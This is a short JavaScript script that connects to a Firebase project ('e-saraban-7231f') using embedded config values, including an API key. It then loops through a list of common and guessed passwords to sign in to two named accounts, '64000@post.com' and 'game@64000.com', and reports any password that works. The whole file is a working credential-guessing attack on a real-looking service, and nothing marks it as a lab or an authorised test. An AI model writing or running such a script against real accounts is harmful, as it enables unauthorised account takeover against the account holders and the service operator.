import { initializeApp } from 'firebase/app';
import { getAuth, signInWithEmailAndPassword } from 'firebase/auth';

const firebaseConfig = {
  apiKey: "AIzaSyDZwqXgKt2jbjSQN-oSDLz4iwvXM-LfsuU",
  authDomain: "e-saraban-7231f.firebaseapp.com",
  projectId: "e-saraban-7231f",
  storageBucket: "e-saraban-7231f.firebasestorage.app",
  messagingSenderId: "780746153339",
  appId: "1:780746153339:web:0d1f5b3ebe742e35f1f1de"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

const passwordsToTry = [
  "Post64000",
  "post64000",
  "64000",
  "64000@post.com",
  "12345678",
  "123456",
  "admin1234",
  "password"
];

async function tryPasswords() {
  for (const pw of passwordsToTry) {
    try {
      const cred = await signInWithEmailAndPassword(auth, "64000@post.com", pw);
      console.log(`FOUND PASSWORD! "${pw}" => UID: ${cred.user.uid}`);
      process.exit(0);
    } catch (e) {
      // ignore invalid credential
    }
  }
  // Try with game@64000.com
  for (const pw of passwordsToTry) {
    try {
      const cred = await signInWithEmailAndPassword(auth, "game@64000.com", pw);
      console.log(`FOUND PASSWORD for game@64000.com! "${pw}" => UID: ${cred.user.uid}`);
      process.exit(0);
    } catch (e) {
      // ignore
    }
  }
  console.log("None of the common passwords matched.");
  process.exit(1);
}

tryPasswords();
